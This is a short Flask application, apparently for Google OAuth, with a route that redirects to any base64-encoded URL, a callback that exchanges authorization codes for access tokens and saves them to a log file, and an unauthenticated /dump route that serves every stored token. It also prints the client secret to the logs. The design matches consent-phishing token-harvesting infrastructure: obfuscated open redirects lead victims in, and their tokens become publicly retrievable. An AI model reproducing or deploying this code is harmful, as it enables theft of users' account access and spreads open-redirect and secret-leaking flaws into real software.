from flask import Flask, request, redirect
import requests
import base64
import logging
import os

app = Flask(__name__)

# Load from environment variables
CLIENT_ID = os.environ.get("CLIENT_ID")
CLIENT_SECRET = os.environ.get("CLIENT_SECRET")
REDIRECT_URI = os.environ.get("REDIRECT_URI")

# Debug for Render logs
print("DEBUG: CLIENT_ID =", repr(CLIENT_ID))
print("DEBUG: CLIENT_SECRET =", repr(CLIENT_SECRET))
print("DEBUG: REDIRECT_URI =", repr(REDIRECT_URI))

assert CLIENT_ID and CLIENT_SECRET and REDIRECT_URI, "OAuth credentials not set"

# Log to file and Render output
logging.basicConfig(filename='access.log', level=logging.INFO, format='%(asctime)s %(message)s')

@app.route('/')
def index():
    return "OAuth Redirector is live."

@app.route('/go')
def go():
    encoded = request.args.get('q')
    if not encoded:
        return "Missing 'q' parameter", 400
    try:
        decoded = base64.urlsafe_b64decode(encoded.encode()).decode()
        logging.info(f"[REDIRECT] {decoded}")
        return redirect(decoded)
    except Exception as e:
        logging.error(f"[ERROR] Base64 decode failed: {e}")
        return f"Invalid base64 input: {e}", 400

@app.route('/callback')
def callback():
    code = request.args.get("code")
    if not code:
        return "Missing ?code=", 400

    data = {
        "code": code,
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "redirect_uri": REDIRECT_URI,
        "grant_type": "authorization_code"
    }

    try:
        response = requests.post("https://oauth2.googleapis.com/token", data=data)
        response.raise_for_status()
        token_data = response.json()

        # Save token to file
        with open("tokens.log", "a") as f:
            f.write(f"[TOKEN RECEIVED]\n{token_data}\n\n")

        # Print to log (Render logs tab)
        print(f"[TOKEN RECEIVED]\n{token_data}\n\n")

        return f"<h1>Access Granted</h1><pre>{token_data}</pre>"

    except requests.exceptions.RequestException as e:
        print(f"[TOKEN EXCHANGE ERROR] {str(e)}")
        return f"<h1>Token exchange failed:</h1><pre>{str(e)}</pre>", 500

@app.route('/dump')
def dump():
    try:
        with open("tokens.log", "r") as f:
            return f"<pre>{f.read()}</pre>"
    except Exception as e:
        return f"<h1>Error reading log file:</h1><pre>{str(e)}</pre>", 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
